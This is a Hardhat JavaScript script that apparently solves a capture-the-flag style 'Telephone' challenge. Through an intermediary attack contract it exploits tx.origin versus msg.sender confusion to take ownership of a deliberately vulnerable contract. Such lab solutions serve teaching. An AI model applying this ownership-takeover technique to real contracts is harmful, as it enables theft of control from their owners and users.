const { getNamedAccounts, ethers, network } = require("hardhat")
const {
    developmentChains,
    networkConfig,
    STANDARD_FEE_VALUE,
} = require("../helper-hardhat-config")

/**
 * The objective is to change the owner of the contract.
 * For this, we need to play with the difference between tx.origin and msg.sender.
 * For a transaction invloving A -> B -> C:
 *  the tx.origin of C is A,
 *  the msg.sender of C is B
 * Therefore, we need to send a transaction to the vulnerable contract (C) using an intermediary attack contract (B).
 */

// Prerequisite: TelephoneAttack must be deployed beforehand

async function performHack() {
    const { deployer, player } = await getNamedAccounts()
    console.log("-------------------------------------")
    console.log("Retrieving contracts and hacker address...")
    let vulnerableContract, attackContract, hacker
    const chainId = network.config.chainId

    if (developmentChains.includes(network.name)) {
        hacker = player
        vulnerableContract = await ethers.getContract("Telephone", hacker)
        attackContract = await ethers.getContract("TelephoneAttack", hacker)
    } else {
        hacker = deployer
        vulnerableContract = await ethers.getContractAt(
            "Telephone",
            networkConfig[chainId]["telephoneContractAddress"],
            hacker
        )
        attackContract = await ethers.getContractAt(
            "TelephoneAttack",
            networkConfig[chainId]["telephoneAttackContractAddress"],
            hacker
        )
    }
    console.log("Done!")
    console.log("-------------------------------------")
    console.log("Showing initial information...")
    await showInitialInformation(vulnerableContract)
    console.log("-------------------------------------")
    console.log("Step 1: Calling the attack contract's function...")
    await attackStart(vulnerableContract, attackContract, hacker)
    console.log("-------------------------------------")
}

async function showInitialInformation(vulnerableContract) {
    console.log(`Hacker is ${await vulnerableContract.signer.address}`)
    console.log(`Contract owner is ${await vulnerableContract.owner()}`)
}

async function attackStart(vulnerableContract, attackContract, hacker) {
    const tx = await attackContract.initiateAttack(hacker)
    await tx.wait(1)
    const newOwner = await vulnerableContract.owner()
    console.log(`New owner is ${newOwner}`)
}

performHack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
